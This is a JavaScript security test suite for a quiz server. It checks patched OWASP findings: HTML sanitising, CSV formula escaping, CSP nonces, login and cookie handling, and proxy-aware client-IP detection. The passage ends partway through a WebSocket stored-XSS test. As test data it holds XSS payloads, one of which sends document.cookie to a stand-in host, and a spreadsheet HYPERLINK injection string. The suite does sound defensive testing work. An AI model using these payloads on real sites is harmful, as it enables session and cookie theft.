// Security test suite for omegaquiz.
// Spawns the server in-process on a random port, then exercises each patched
// finding from the OWASP review. Prints one line per assertion + a final tally.
//
// Run with: node test/security.test.js
//
// Each test must be self-contained (any cookies / state it sets up is its own
// problem). Tests assert against the LIVE server, not mocks, because the bugs
// we're testing for are integration-level.

const http = require('http');
const path = require('path');
const WebSocket = require('ws');
// fs/os are required below where DATA_DIR is created.

// Force a deterministic env for the server under test.
process.env.HOST_TOKEN  = 'test-host-token-' + Math.random().toString(36).slice(2);
process.env.ADMIN_TOKEN = 'test-admin-token-' + Math.random().toString(36).slice(2);
process.env.NODE_ENV    = 'test';
process.env.PORT        = '0';
process.env.SAMPLE_PACKS_URL = 'https://samples.test/manifest.json';
// Use a per-run DATA_DIR so we don't clobber any real config.json
const fs = require('fs');
const os = require('os');
process.env.DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'omegaquiz-test-'));

const srv = require('../server.js');
const { app, server, sanitizeQuestionHtml, sanitizeQuestionImage, csvField, tokensEqual, packCookie, createSession, validateBranding, loadBranding, CONFIG_PATH, mintMagicToken, consumeMagicToken, parsePublicBaseUrl, getPublicBaseUrl, validateTheme, DEFAULT_THEME, DEFAULT_CONSENT_TEXT, parseCsv, stringifyCsv, questionsToCsv, questionsFromCsv, loadQuestionsFromDisk, QUESTIONS_PATH, fetchJsonSafe, loadBundledSampleJson, parseStartupArgs, parseSeedBody, normalizeQuestionBank, loadDotenv, brandingFromEnv, gracefulShutdown, recordJoinFailure, isJoinBlocked, clearJoinFailures, JOIN_FAILURE_MAX, recordLoginFailure, isBlocked, clearLoginFailures, LOGIN_FAILURE_MAX, getClientIp, isCloudflareEdgeIp, isPrivateOrLoopbackIp, ipMatchesCidr, normalizeIp, parseCookies, isSafeNext, parseReconnectWindowSeconds, reconnectRemainingMs, isWithinReconnectWindow, PLAYER_RECONNECT_WINDOW_MS } = srv;

// ----------------------------------------------------------------------------
// Tiny test runner
// ----------------------------------------------------------------------------
let pass = 0, fail = 0;
const failures = [];

function ok(cond, name, detail) {
  if (cond) { pass++; console.log('  \x1b[32m✓\x1b[0m ' + name); }
  else      { fail++; failures.push({ name, detail }); console.log('  \x1b[31m✗\x1b[0m ' + name + (detail ? '\n      ' + detail : '')); }
}
function section(name) { console.log('\n\x1b[1m' + name + '\x1b[0m'); }

// ----------------------------------------------------------------------------
// HTTP / WS helpers against the test server
// ----------------------------------------------------------------------------
function getPort() { return server.address().port; }

function request(method, urlPath, { headers = {}, body = null, followRedirect = false } = {}) {
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: '127.0.0.1', port: getPort(), method, path: urlPath, headers: { ...headers }
    };
    if (body !== null && body !== undefined) {
      opts.headers['Content-Length'] = Buffer.byteLength(body);
    }
    const req = http.request(opts, res => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => {
        const buf = Buffer.concat(chunks);
        const result = { status: res.statusCode, headers: res.headers, body: buf.toString('utf8'), buffer: buf, setCookie: res.headers['set-cookie'] || [] };
        if (followRedirect && (res.statusCode === 301 || res.statusCode === 302) && res.headers.location) {
          // pick up cookies from this hop before following
          const carry = { ...headers };
          const c = (res.headers['set-cookie'] || []).map(s => s.split(';')[0]).join('; ');
          if (c) carry.cookie = (headers.cookie ? headers.cookie + '; ' : '') + c;
          request(method === 'POST' ? 'GET' : method, res.headers.location, { headers: carry, followRedirect: false }).then(resolve, reject);
        } else {
          resolve(result);
        }
      });
    });
    req.on('error', reject);
    if (body !== null && body !== undefined) req.write(body);
    req.end();
  });
}

function loginAs(role, token) {
  const body = `role=${encodeURIComponent(role)}&token=${encodeURIComponent(token)}&next=${encodeURIComponent('/' + role)}`;
  return request('POST', '/auth/login', {
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body
  }).then(res => {
    const sessCookie = (res.setCookie || []).map(s => s.split(';')[0]).find(s => s.startsWith('omegaquiz_sess='));
    return { res, cookie: sessCookie || null };
  });
}

function openWs({ cookie, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const wsHeaders = { ...headers };
    if (cookie) wsHeaders.Cookie = cookie;
    const ws = new WebSocket('ws://127.0.0.1:' + getPort(), {
      headers: wsHeaders
    });
    ws.on('open', () => resolve(ws));
    ws.on('error', reject);
  });
}
function waitMessage(ws, predicate, timeout = 2000) {
  return new Promise((resolve, reject) => {
    const t = setTimeout(() => { ws.off('message', onMsg); reject(new Error('timeout waiting for message')); }, timeout);
    function onMsg(raw) {
      let msg; try { msg = JSON.parse(raw); } catch { return; }
      if (predicate(msg)) { clearTimeout(t); ws.off('message', onMsg); resolve(msg); }
    }
    ws.on('message', onMsg);
  });
}

// ----------------------------------------------------------------------------
// Unit-level pure-function tests
// ----------------------------------------------------------------------------
function unitTests() {
  section('Unit: helpers');

  ok(tokensEqual('abc', 'abc') === true, 'tokensEqual: equal strings');
  ok(tokensEqual('abc', 'abd') === false, 'tokensEqual: different strings');
  ok(tokensEqual('abc', 'ab')  === false, 'tokensEqual: different lengths');
  ok(tokensEqual(123, '123') === false, 'tokensEqual: non-string rejected');

  // A03-1 sanitiser
  ok(sanitizeQuestionHtml('<script>alert(1)</script>') === '&lt;script&gt;alert(1)&lt;/script&gt;', 'sanitizer: <script> is neutralised');
  ok(sanitizeQuestionHtml('<img src=x onerror=alert(1)>') === '&lt;img src=x onerror=alert(1)&gt;', 'sanitizer: <img onerror> neutralised');
  ok(sanitizeQuestionHtml('<em>real</em>') === '<em>real</em>', 'sanitizer: <em> allowlisted');
  ok(sanitizeQuestionHtml('<span class="mono">code</span>') === '<span class="mono">code</span>', 'sanitizer: <span class="mono"> allowlisted');
  ok(sanitizeQuestionHtml('plain & < > " text') === 'plain &amp; &lt; &gt; &quot; text', 'sanitizer: escapes metacharacters');
  ok(sanitizeQuestionHtml('<svg onload=alert(1)>') === '&lt;svg onload=alert(1)&gt;', 'sanitizer: <svg onload> neutralised');
  ok(sanitizeQuestionHtml('<span class="evil">x</span>').indexOf('class="evil"') === -1, 'sanitizer: non-mono span class stripped');

  // Idempotency: re-sanitising a sanitised value must not accumulate escape layers.
  const apos = sanitizeQuestionHtml("It's a test");
  ok(apos === 'It&#39;s a test', 'sanitizer: apostrophe encoded once');
  ok(sanitizeQuestionHtml(apos) === apos, 'sanitizer: idempotent on apostrophe');
  const amp = sanitizeQuestionHtml('A & B');
  ok(amp === 'A &amp; B', 'sanitizer: ampersand encoded once');
  ok(sanitizeQuestionHtml(amp) === amp, 'sanitizer: idempotent on ampersand');
  const tag = sanitizeQuestionHtml('<span class="mono">code</span>');
  ok(sanitizeQuestionHtml(tag) === tag, 'sanitizer: idempotent on allowed tags');
  const mix = sanitizeQuestionHtml('A & B with <em>x</em> & "quotes"');
  ok(sanitizeQuestionHtml(mix) === mix, 'sanitizer: idempotent on mixed content');

  // A03-2 CSV escape
  ok(csvField('=HYPERLINK("http://evil","x")').startsWith('"\'='), 'csvField: leading = is escaped with apostrophe');
  ok(csvField('@SUM(1)').startsWith('"\'@'), 'csvField: leading @ is escaped');
  ok(csvField('+1234567890').startsWith('"\'+'), 'csvField: leading + is escaped');
  ok(csvField('Alex Chen') === '"Alex Chen"', 'csvField: normal value untouched');
  ok(csvField('she said "hi"').includes('""hi""'), 'csvField: internal quotes doubled');

  const bundledManifest = loadBundledSampleJson('bundled:samples/manifest.json');
  ok(Array.isArray(bundledManifest.packs) && bundledManifest.packs.length >= 1, 'bundled sample manifest loads');
  ok(bundledManifest.packs.every(p => /^bundled:samples\/[A-Za-z0-9._-]+\.json$/.test(p.url)), 'bundled manifest points at bundled pack URLs');
  const bundledPack = loadBundledSampleJson(bundledManifest.packs[0].url);
  ok(Array.isArray(bundledPack.main) && bundledPack.main.length > 0, 'bundled sample pack loads questions');
  let bundledRejected = false;
  try { loadBundledSampleJson('bundled:samples/../package.json'); } catch { bundledRejected = true; }
  ok(bundledRejected, 'bundled sample loader rejects path traversal');

  section('Unit: question-bank validation');
  const goodQuestion = { q: 'Valid?', options: ['A','B','C','D'], correct: 0, lesson: 'Because.' };
  const validBank = normalizeQuestionBank({
    main: [goodQuestion],
    bonus: [{ ...goodQuestion, q: 'Bonus?', correct: 1 }]
  }, { label: 'test bank', requireMain: true });
  ok(validBank.main.length === 1 && validBank.bonus.length === 1, 'normalizeQuestionBank accepts a valid main + bonus bank');

  let bankRejected = false;
  try { normalizeQuestionBank({ main: [{ ...goodQuestion, options: ['A','B','C'] }], bonus: [] }, { label: 'bad bank', requireMain: true }); }
  catch (e) { bankRejected = /4 options/.test(e.message); }
  ok(bankRejected, 'normalizeQuestionBank rejects missing options');

  bankRejected = false;
  try { normalizeQuestionBank({ main: [{ ...goodQuestion, correct: 9 }], bonus: [] }, { label: 'bad bank', requireMain: true }); }
  catch (e) { bankRejected = /correct/.test(e.message); }
  ok(bankRejected, 'normalizeQuestionBank rejects invalid correct index');

  bankRejected = false;
  try { normalizeQuestionBank({ main: [], bonus: [] }, { label: 'bad bank', requireMain: true }); }
  catch (e) { bankRejected = /at least one main/.test(e.message); }
  ok(bankRejected, 'normalizeQuestionBank rejects an empty main bank when required');

  bankRejected = false;
  try { normalizeQuestionBank({ main: [goodQuestion], bonus: [{ ...goodQuestion, q: '' }] }, { label: 'bad bank', requireMain: true }); }
  catch (e) { bankRejected = /bonus question 1/.test(e.message) && /non-empty q/.test(e.message); }
  ok(bankRejected, 'normalizeQuestionBank rejects malformed bonus rows');

  section('Unit: reverse-proxy aware client IP detection');
  const fakeReq = (remoteAddress, headers = {}) => ({ socket: { remoteAddress }, headers });
  ok(normalizeIp('::ffff:127.0.0.1') === '127.0.0.1', 'normalizeIp unwraps IPv4-mapped IPv6');
  ok(isCloudflareEdgeIp('173.245.48.1') === true, 'Cloudflare IPv4 edge range is recognised');
  ok(isCloudflareEdgeIp('2606:4700::1') === true, 'Cloudflare IPv6 edge range is recognised');
  ok(isCloudflareEdgeIp('127.0.0.1') === false, 'localhost is not treated as a Cloudflare edge');
  ok(ipMatchesCidr('173.245.48.1', '173.245.48.0/20') === true, 'ipMatchesCidr handles IPv4 ranges');
  // Cloudflare edge → CF-Connecting-IP / XFF are trusted (unchanged from v1.1.0).
  ok(getClientIp(fakeReq('173.245.48.1', { 'cf-connecting-ip': '203.0.113.7' })) === '203.0.113.7', 'Cloudflare CF-Connecting-IP is trusted from edge IPs');
  ok(getClientIp(fakeReq('173.245.48.1', { 'x-forwarded-for': '198.51.100.10, 173.245.48.1' })) === '198.51.100.10', 'Cloudflare X-Forwarded-For fallback uses first valid client IP');
  // F3 (v1.1.1): non-CF reverse proxies (Railway / Render / Fly / Docker / nginx
  // on localhost) appear to us as loopback / RFC1918 / 100.64-CGN sockets. We
  // trust X-Forwarded-For in those cases — otherwise every visitor would share
  // the proxy's IP and per-IP rate limits would collapse.
  ok(isPrivateOrLoopbackIp('127.0.0.1') === true, 'isPrivateOrLoopbackIp: 127.0.0.1');
  ok(isPrivateOrLoopbackIp('10.0.0.5') === true, 'isPrivateOrLoopbackIp: 10/8');
  ok(isPrivateOrLoopbackIp('172.16.5.5') === true, 'isPrivateOrLoopbackIp: 172.16/12');
  ok(isPrivateOrLoopbackIp('192.168.1.1') === true, 'isPrivateOrLoopbackIp: 192.168/16');
  ok(isPrivateOrLoopbackIp('100.64.0.1') === true, 'isPrivateOrLoopbackIp: 100.64/10 CGN (Railway-shape)');
  ok(isPrivateOrLoopbackIp('169.254.0.1') === true, 'isPrivateOrLoopbackIp: 169.254/16 link-local');
  ok(isPrivateOrLoopbackIp('8.8.8.8') === false, 'isPrivateOrLoopbackIp: public IPv4 rejected');
  ok(isPrivateOrLoopbackIp('::1') === true, 'isPrivateOrLoopbackIp: IPv6 loopback');
  ok(isPrivateOrLoopbackIp('fd00::1') === true, 'isPrivateOrLoopbackIp: IPv6 ULA fc00::/7');
  ok(isPrivateOrLoopbackIp('fe80::1') === true, 'isPrivateOrLoopbackIp: IPv6 link-local fe80::/10');
  ok(isPrivateOrLoopbackIp('2606:4700::1') === false, 'isPrivateOrLoopbackIp: public IPv6 rejected');
  ok(getClientIp(fakeReq('127.0.0.1', { 'x-forwarded-for': '203.0.113.9' })) === '203.0.113.9', 'loopback peer (local proxy) → trust XFF');
  ok(getClientIp(fakeReq('100.64.0.1', { 'x-forwarded-for': '203.0.113.9' })) === '203.0.113.9', 'CGN peer (Railway-shape) → trust XFF');
  ok(getClientIp(fakeReq('8.8.8.8', { 'x-forwarded-for': '203.0.113.9' })) === '8.8.8.8', 'public-IP peer → DO NOT trust XFF (direct client cannot spoof)');
  ok(getClientIp(fakeReq('127.0.0.1', {})) === '127.0.0.1', 'no XFF → socket IP returned even from loopback');

  section('Unit: player reconnect window');
  ok(parseReconnectWindowSeconds(undefined) === 300, 'reconnect window: missing env defaults to 300s');
  ok(parseReconnectWindowSeconds('not-a-number') === 300, 'reconnect window: invalid env defaults to 300s');
  ok(parseReconnectWindowSeconds('10') === 30, 'reconnect window: values below 30s clamp up');
  ok(parseReconnectWindowSeconds('120') === 120, 'reconnect window: valid value passes through');
  ok(parseReconnectWindowSeconds('1200') === 900, 'reconnect window: values above 900s clamp down');
  ok(PLAYER_RECONNECT_WINDOW_MS === 300000, 'reconnect window: default runtime window is 5 minutes');
  ok(reconnectRemainingMs({}, 1000) === 0, 'reconnectRemainingMs: no disconnectedAt returns 0');
  ok(reconnectRemainingMs({ disconnectedAt: 1000 }, 61_000) === 240_000, 'reconnectRemainingMs: 60s elapsed leaves 240s');
  ok(reconnectRemainingMs({ disconnectedAt: 1000 }, 361_000) === 0, 'reconnectRemainingMs: expired window returns 0');
  ok(isWithinReconnectWindow({ disconnectedAt: 1000 }, 241_000) === true, 'isWithinReconnectWindow: 4 minutes is still reconnectable');
  ok(isWithinReconnectWindow({ disconnectedAt: 1000 }, 361_000) === false, 'isWithinReconnectWindow: 6 minutes is expired');

  section('Unit: parseStartupArgs (seed URL CLI flag)');
  // argv[0] and argv[1] are node + script — parseStartupArgs starts at index 2.
  const noFlag = parseStartupArgs(['node','server.js']);
  ok(noFlag.seedUrl === '', 'no flag → empty seedUrl');
  const shortFlag = parseStartupArgs(['node','server.js','-u','https://example.com/q.json']);
  ok(shortFlag.seedUrl === 'https://example.com/q.json', '-u <URL> parsed');
  const longFlag = parseStartupArgs(['node','server.js','--seed-url','https://example.com/q.csv']);
  ok(longFlag.seedUrl === 'https://example.com/q.csv', '--seed-url <URL> parsed');
  const eqForm = parseStartupArgs(['node','server.js','--seed-url=https://example.com/x.json']);
  ok(eqForm.seedUrl === 'https://example.com/x.json', '--seed-url=URL parsed');
  const aliasUrl = parseStartupArgs(['node','server.js','--url','https://example.com/y.json']);
  ok(aliasUrl.seedUrl === 'https://example.com/y.json', '--url alias accepted');
  // Env-var fallback. Save + restore around the test so we don't leak.
  const saved = process.env.QUESTIONS_SEED_URL;
  process.env.QUESTIONS_SEED_URL = 'https://envvar.example.com/p.json';
  const envOnly = parseStartupArgs(['node','server.js']);
  ok(envOnly.seedUrl === 'https://envvar.example.com/p.json', 'env var fallback when flag absent');
  const flagWinsOverEnv = parseStartupArgs(['node','server.js','-u','https://cli.example.com/p.json']);
  ok(flagWinsOverEnv.seedUrl === 'https://cli.example.com/p.json', 'CLI flag wins over env var');
  if (saved === undefined) delete process.env.QUESTIONS_SEED_URL;
  else process.env.QUESTIONS_SEED_URL = saved;
  const helpFlag = parseStartupArgs(['node','server.js','--help']);
  ok(helpFlag.help === true, '--help recognised');

  section('Unit: parseSeedBody (JSON + CSV detection)');
  // JSON path — main + bonus arrays.
  const jsonBody = JSON.stringify({
    main:  [{ q: 'A?', options: ['x','y','z','w'], correct: 0, lesson: 'L' }],
    bonus: [{ q: 'B?', options: ['x','y','z','w'], correct: 1, lesson: 'L' }]
  });
  const fromJsonCt = parseSeedBody(jsonBody, 'application/json; charset=utf-8', 'https://x/pack');
  ok(fromJsonCt.format === 'json' && fromJsonCt.main.length === 1 && fromJsonCt.bonus.length === 1, 'parseSeedBody: JSON via Content-Type');
  const fromJsonExt = parseSeedBody(jsonBody, '', 'https://x/pack.json');
  ok(fromJsonExt.format === 'json', 'parseSeedBody: JSON via .json extension');
  // "questions" alias for "main".
  const aliased = parseSeedBody(JSON.stringify({ questions: [{ q: 'A?', options: ['x','y','z','w'], correct: 0, lesson: 'L' }] }), 'application/json', 'https://x/p');
  ok(aliased.main.length === 1 && aliased.bonus.length === 0, 'parseSeedBody: "questions" key alias accepted');
  // CSV path — build with questionsToCsv so the header always matches the
  // shape the parser expects (kept stable via CSV_HEADERS export).
  const csv = questionsToCsv(
    [{ q: 'Cap of FR?', options: ['Paris','Lyon','Nice','Lille'], correct: 0, lesson: 'Paris is the capital.' }],
    []
  );
  const fromCsv = parseSeedBody(csv, 'text/csv', 'https://x/pack.csv');
  ok(fromCsv.format === 'csv' && fromCsv.main.length === 1, 'parseSeedBody: CSV via Content-Type');
  // Ambiguous CT but .csv extension — should treat as CSV.
  const fromCsvExt = parseSeedBody(csv, 'application/octet-stream', 'https://x/anon.csv');
  ok(fromCsvExt.main.length === 1, 'parseSeedBody: CSV via .csv extension');
  // Garbage that isn't valid JSON OR CSV → throws.
  let seedThrew = false;
  try { parseSeedBody('not-a-question-bank', '', 'https://x/whatever.txt'); }
  catch { seedThrew = true; }
  ok(seedThrew, 'parseSeedBody: unusable body throws');

  seedThrew = false;
  try {
    parseSeedBody(JSON.stringify({ main: [{ q: 'Bad?', options: ['a','b','c'], correct: 0, lesson: 'L' }] }), 'application/json', 'https://x/bad.json');
  } catch { seedThrew = true; }
  ok(seedThrew, 'parseSeedBody: JSON seed with malformed question throws');

  seedThrew = false;
  try { parseSeedBody(JSON.stringify({ main: [], bonus: [] }), 'application/json', 'https://x/empty.json'); }
  catch { seedThrew = true; }
  ok(seedThrew, 'parseSeedBody: JSON seed with empty main bank throws');

  section('Unit: loadDotenv (.env parser)');
  // Write a temp .env, point loadDotenv at it, check it lands in process.env.
  const tmpEnvPath = path.join(os.tmpdir(), 'cq-test-' + Date.now() + '.env');
  fs.writeFileSync(tmpEnvPath, [
    '# A comment line',
    '',
    'CQTEST_PLAIN=hello',
    '  CQTEST_INDENTED  =  spaces-trimmed  ',
    'CQTEST_QUOTED_DBL="value with spaces"',
    "CQTEST_QUOTED_SGL='single-quoted'",
    'CQTEST_INLINE_COMMENT=foo # this is a comment',
    'CQTEST_QUOTED_HASH="https://x.example.com/#frag"',
    'export CQTEST_EXPORTED=bar',
    'CQTEST_PRESET=should-not-overwrite',
    'malformed line without equals',
    ''
  ].join('\n'));
  // Pre-set this one to prove "process env wins" over .env values.
  process.env.CQTEST_PRESET = 'pre-existing-value';
  delete process.env.CQTEST_PLAIN;
  delete process.env.CQTEST_INDENTED;
  delete process.env.CQTEST_QUOTED_DBL;
  delete process.env.CQTEST_QUOTED_SGL;
  delete process.env.CQTEST_INLINE_COMMENT;
  delete process.env.CQTEST_QUOTED_HASH;
  delete process.env.CQTEST_EXPORTED;
  const dotResult = loadDotenv(tmpEnvPath);
  ok(dotResult.loaded === true, 'loadDotenv: returned loaded=true for existing file');
  ok(dotResult.count >= 7, 'loadDotenv: count reflects parsed keys');
  ok(process.env.CQTEST_PLAIN === 'hello', 'loadDotenv: KEY=value');
  ok(process.env.CQTEST_INDENTED === 'spaces-trimmed', 'loadDotenv: whitespace trimmed around key + value');
  ok(process.env.CQTEST_QUOTED_DBL === 'value with spaces', 'loadDotenv: double-quoted value stripped of quotes');
  ok(process.env.CQTEST_QUOTED_SGL === 'single-quoted', 'loadDotenv: single-quoted value');
  ok(process.env.CQTEST_INLINE_COMMENT === 'foo', 'loadDotenv: inline # comment stripped from unquoted value');
  ok(process.env.CQTEST_QUOTED_HASH === 'https://x.example.com/#frag', 'loadDotenv: # inside quotes NOT treated as comment');
  ok(process.env.CQTEST_EXPORTED === 'bar', 'loadDotenv: "export KEY=value" syntax accepted');
  ok(process.env.CQTEST_PRESET === 'pre-existing-value', 'loadDotenv: pre-existing process env value NOT overwritten');
  // Cleanup
  fs.unlinkSync(tmpEnvPath);
  for (const k of ['CQTEST_PLAIN','CQTEST_INDENTED','CQTEST_QUOTED_DBL','CQTEST_QUOTED_SGL','CQTEST_INLINE_COMMENT','CQTEST_QUOTED_HASH','CQTEST_EXPORTED','CQTEST_PRESET']) delete process.env[k];
  // Missing file → returns loaded=false, no throw.
  const missing = loadDotenv('/definitely/not/a/real/path/cq-no-such.env');
  ok(missing.loaded === false, 'loadDotenv: missing file returns loaded=false (no throw)');

  section('Unit: brandingFromEnv (admin defaults via env vars)');
  // Snapshot all env keys we touch so we can restore them at the end.
  const envSnapshot = {};
  const envKeys = ['COMPANY_NAME','COMPANY_DOMAIN','RESTRICT_DOMAIN','TAGLINE','QUIZ_TITLE','QUIZ_CATEGORY','LEVEL_STYLE','SHOW_NAMES_AT_END','ANSWER_LOCK_MODE','ELIMINATED_CAN_ANSWER','LIFELINE_REFILL','THEME_GOLD','THEME_RED'];
  for (const k of envKeys) envSnapshot[k] = process.env[k];

  // All unset → fall back to DEFAULT_BRANDING shape.
  for (const k of envKeys) delete process.env[k];
  const empty = brandingFromEnv();
  ok(empty.companyName === '' && empty.quizTitle === 'Omega Quiz', 'brandingFromEnv: empty env → defaults');
  ok(empty.lifelineRefill === 'never' && empty.levelStyle === 'money', 'brandingFromEnv: enum defaults');
  ok(empty.theme && empty.theme.gold === DEFAULT_THEME.gold, 'brandingFromEnv: theme defaults');

  // Strings + truthy/falsy booleans.
  process.env.COMPANY_NAME = 'Acme Co';
  process.env.COMPANY_DOMAIN = 'acme.com';
  process.env.RESTRICT_DOMAIN = 'yes';
  process.env.TAGLINE = 'Quarterly drill';
  process.env.QUIZ_TITLE = 'Phishing Edition';
  process.env.QUIZ_CATEGORY = 'cyber-train';
  process.env.LEVEL_STYLE = 'levels';
  process.env.SHOW_NAMES_AT_END = 'false';
  process.env.ANSWER_LOCK_MODE = 'confirm';
  process.env.ELIMINATED_CAN_ANSWER = '1';
  process.env.LIFELINE_REFILL = 'each-question';
  process.env.THEME_GOLD = '#ff8800';
  process.env.THEME_RED  = 'not-a-hex';   // should be IGNORED, keeping default
  const populated = brandingFromEnv();
  ok(populated.companyName === 'Acme Co', 'brandingFromEnv: companyName');
  ok(populated.companyDomain === 'acme.com', 'brandingFromEnv: companyDomain');
  ok(populated.restrictDomain === true, 'brandingFromEnv: RESTRICT_DOMAIN=yes → true');
  ok(populated.tagline === 'Quarterly drill', 'brandingFromEnv: tagline');
  ok(populated.quizTitle === 'Phishing Edition', 'brandingFromEnv: quizTitle');
  ok(populated.quizCategory === 'cyber-train', 'brandingFromEnv: quizCategory');
  ok(populated.levelStyle === 'levels', 'brandingFromEnv: LEVEL_STYLE=levels');
  ok(populated.showNamesAtEnd === false, 'brandingFromEnv: SHOW_NAMES_AT_END=false');
  ok(populated.answerLockMode === 'confirm', 'brandingFromEnv: ANSWER_LOCK_MODE=confirm');
  ok(populated.eliminatedCanAnswer === true, 'brandingFromEnv: ELIMINATED_CAN_ANSWER=1');
  ok(populated.lifelineRefill === 'each-question', 'brandingFromEnv: lifelineRefill');
  ok(populated.theme.gold === '#ff8800', 'brandingFromEnv: theme override');
  ok(populated.theme.red === DEFAULT_THEME.red, 'brandingFromEnv: invalid hex falls back to default');

  // Invalid enum value should fall through to default rather than crash.
  process.env.LEVEL_STYLE = 'bogus';
  const enumBogus = brandingFromEnv();
  ok(enumBogus.levelStyle === 'money', 'brandingFromEnv: invalid LEVEL_STYLE → default');

  // Restore env so we don't leak into later tests.
  for (const k of envKeys) {
    if (envSnapshot[k] === undefined) delete process.env[k];
    else process.env[k] = envSnapshot[k];
  }
}

// ----------------------------------------------------------------------------
// HTTP / WS integration tests
// ----------------------------------------------------------------------------
async function httpTests() {
  section('HTTP: security headers (A05-1)');
  {
    const r = await request('GET', '/');
    ok(r.status === 200, 'GET / returns 200');
    const csp = r.headers['content-security-policy'] || '';
    ok(csp.includes("default-src 'self'"), 'CSP header present', csp);
    // S3: script-src has migrated to a nonce. No 'unsafe-inline' for scripts.
    const scriptSrc = csp.split(';').map(s => s.trim()).find(s => s.startsWith('script-src')) || '';
    ok(!scriptSrc.includes("'unsafe-inline'"), 'script-src does not include \'unsafe-inline\' (nonce-only)', scriptSrc);
    ok(/'nonce-[A-Za-z0-9+/=]+'/.test(scriptSrc), 'script-src includes a per-response nonce', scriptSrc);
    // Nonces must rotate per response.
    const r2 = await request('GET', '/');
    const csp2 = r2.headers['content-security-policy'] || '';
    const scriptSrc2 = csp2.split(';').map(s => s.trim()).find(s => s.startsWith('script-src')) || '';
    ok(scriptSrc !== scriptSrc2, 'CSP nonce rotates between requests');
    // Served HTML carries the nonce on its <script> tags.
    ok(/<script nonce="[A-Za-z0-9+/=]+"/.test(r.body), 'served HTML <script> tags carry a nonce attribute');
    ok(r.headers['x-frame-options'] === 'DENY', 'X-Frame-Options: DENY');
    ok(r.headers['referrer-policy'] === 'no-referrer', 'Referrer-Policy: no-referrer');
    ok(r.headers['x-content-type-options'] === 'nosniff', 'X-Content-Type-Options: nosniff');
  }

  section('HTTP: protected routes refuse anonymous access (A01-2)');
  {
    const r1 = await request('GET', '/admin');
    ok(r1.status === 302 && (r1.headers.location || '').startsWith('/auth/login'), '/admin → 302 → /auth/login');
    const r2 = await request('GET', '/host');
    ok(r2.status === 302 && (r2.headers.location || '').startsWith('/auth/login'), '/host → 302 → /auth/login');
    const r3 = await request('GET', '/results.csv');
    ok(r3.status === 302, '/results.csv → 302 when anonymous');
    const r4 = await request('GET', '/lessons.json');
    ok(r4.status === 302, '/lessons.json → 302 when anonymous');
    const r5 = await request('GET', '/admin.html');
    ok(r5.status === 404, 'direct /admin.html → 404 (static bypass blocked)');
    const r6 = await request('GET', '/host.html');
    ok(r6.status === 404, 'direct /host.html → 404 (static bypass blocked)');
    const r7 = await request('GET', '/qr');
    ok(r7.status === 302 && (r7.headers.location || '').startsWith('/auth/login'), '/qr → 302 → /auth/login when anonymous');
  }

  section('HTTP: login flow (A01-1, A07-1)');
  {
    // Wrong token
    const wrong = await request('POST', '/auth/login', {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'role=admin&token=not-the-token'
    });
    ok(wrong.status === 302 && (wrong.headers.location || '').includes('error=1'), 'wrong admin token → redirect with error=1');
    const cookiesSetOnFail = (wrong.setCookie || []).join(';');
    ok(!cookiesSetOnFail.includes('omegaquiz_sess='), 'no session cookie set on failed login');

    // Correct token
    const { res, cookie } = await loginAs('admin', process.env.ADMIN_TOKEN);
    ok(res.status === 302 && res.headers.location === '/admin', 'admin login → 302 → /admin');
    ok(cookie && cookie.startsWith('omegaquiz_sess='), 'session cookie set on success');
    const cookieAttrs = (res.setCookie || []).join('; ');
    ok(cookieAttrs.includes('HttpOnly'), 'cookie is HttpOnly');
    ok(cookieAttrs.includes('SameSite=Strict'), 'cookie is SameSite=Strict');

    // Use the cookie to reach /admin
    const r2 = await request('GET', '/admin', { headers: { Cookie: cookie } });
    ok(r2.status === 200 && /Omega Quiz Admin/i.test(r2.body), '/admin reachable with valid cookie');

    // host login similarly
    const h = await loginAs('host', process.env.HOST_TOKEN);
    ok(h.cookie && h.cookie.startsWith('omegaquiz_sess='), 'host login sets cookie');
    const rh = await request('GET', '/host', { headers: { Cookie: h.cookie } });
    ok(rh.status === 200, '/host reachable with valid host cookie');

    // Cross-role: host cookie cannot access /admin
    const rh2 = await request('GET', '/admin', { headers: { Cookie: h.cookie } });
    ok(rh2.status === 302, 'host cookie cannot access /admin (cross-role)');

    // Tampered cookie
    const tampered = cookie.replace(/.$/, c => c === 'a' ? 'b' : 'a');
    const rt = await request('GET', '/admin', { headers: { Cookie: tampered } });
    ok(rt.status === 302, 'tampered cookie rejected');
  }

  section('HTTP: results.csv requires admin and escapes formulas (A01-2 + A03-2)');
  {
    const { cookie } = await loginAs('admin', process.env.ADMIN_TOKEN);
    const r = await request('GET', '/results.csv', { headers: { Cookie: cookie } });
    ok(r.status === 200, '/results.csv → 200 with admin cookie');
    ok(/text\/csv/.test(r.headers['content-type'] || ''), 'Content-Type is text/csv');
    // Header row should be present and quoted.
    ok(r.body.startsWith('"Name"'), 'CSV header begins with quoted "Name"');
  }
}

// ----------------------------------------------------------------------------
// WebSocket / end-to-end tests
// ----------------------------------------------------------------------------
async function wsTests() {
  section('WS: admin connection requires admin cookie (A01-1)');
  {
    // Anonymous WS sends admin:hello → should be closed.
    const ws = await openWs();
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    let closed = false;
    ws.on('close', () => { closed = true; });
    await new Promise(r => setTimeout(r, 300));
    ok(closed, 'anonymous admin:hello → ws closed');
    try { ws.close(); } catch {}
  }
  {
    const { cookie } = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    const init = await waitMessage(ws, m => m.type === 'admin:init');
    ok(Array.isArray(init.questions), 'admin:hello → admin:init returned');
    try { ws.close(); } catch {}
  }

  section('WS: stored XSS via questions:update is sanitised at write time (A03-1)');
  {
    const { cookie } = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');

    const malicious = '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">';
    const xssPayload = {
      type: 'admin:action', action: 'questions:update',
      payload: {
        main: [{ q: malicious, options: ['a','b','c','d'], correct: 0, lesson: '<script>steal()</script>' }],
        bonus: [{ q: 'b?', options: ['1','2','3','4'], correct: 0, lesson: 'l' }]
      }
    };
    ws.send(JSON.stringify(xssPayload));
    const updated = await waitMessage(ws, m => m.type === 'admin:questions');
